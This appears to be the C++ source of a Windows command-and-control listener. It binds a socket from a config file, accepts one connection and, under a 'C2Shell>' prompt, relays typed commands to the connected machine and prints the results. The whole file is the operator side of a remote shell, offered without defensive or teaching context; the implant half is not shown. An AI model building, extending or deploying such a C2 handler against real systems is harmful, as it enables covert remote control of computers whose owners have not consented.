#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

bool loadConfig(string &ip, int &port) {
    ifstream config("server_config.txt");
    if (!config.is_open()) {
        cerr << "[!] Could not open server_config.txt\n";
        return false;
    }
    string line;
    while (getline(config, line)) {
        if (line.find("IP=") == 0) {
            ip = line.substr(3);
        } else if (line.find("PORT=") == 0) {
            port = stoi(line.substr(5));
        }
    }
    return !(ip.empty() || port == 0);
}

int main() {
    string bindIP;
    int bindPort = 0;
    if (!loadConfig(bindIP, bindPort)) {
        cerr << "[!] Invalid or missing config.\n";
        return 1;
    }

    WSADATA wsaData;
    int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsInit != 0) {
        cerr << "[!] Winsock startup failed: " << wsInit << "\n";
        return 1;
    } else {
        cout << "The Winsock DLL found!\n";
        cout << "The Status: " << wsaData.szSystemStatus << endl;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (listenSocket == INVALID_SOCKET) {
        cerr << "[!] Socket Creation Failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(bindPort);
    inet_pton(AF_INET, bindIP.c_str(), &serverAddr.sin_addr);

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "[!] Bind failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "[!] Listen failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    cout << "[+] Waiting for incoming connection on " << bindIP << ":" << bindPort << "...\n";

    SOCKET clientSocket;
    sockaddr_in clientAddr;
    int clientSize = sizeof(clientAddr);

    clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "[!] Accept failed: " << WSAGetLastError() << "\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    cout << "[+] Client connected!\n";

    char buffer[4096];
    string command;

    while (true) {
        cout << "C2Shell>";
        getline(cin, command);

        int sendResult = send(clientSocket, command.c_str(), command.size() + 1, 0);
        if (sendResult == SOCKET_ERROR) {
            cerr << "[!] Send failed.\n";
            break;
        }

        if (command == "exit") break;

        ZeroMemory(buffer, 4096);
        int bytesReceived = recv(clientSocket, buffer, 4096, 0);
        if (bytesReceived > 0) {
            cout << buffer << "\n";
        }
    }

    closesocket(clientSocket);
    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
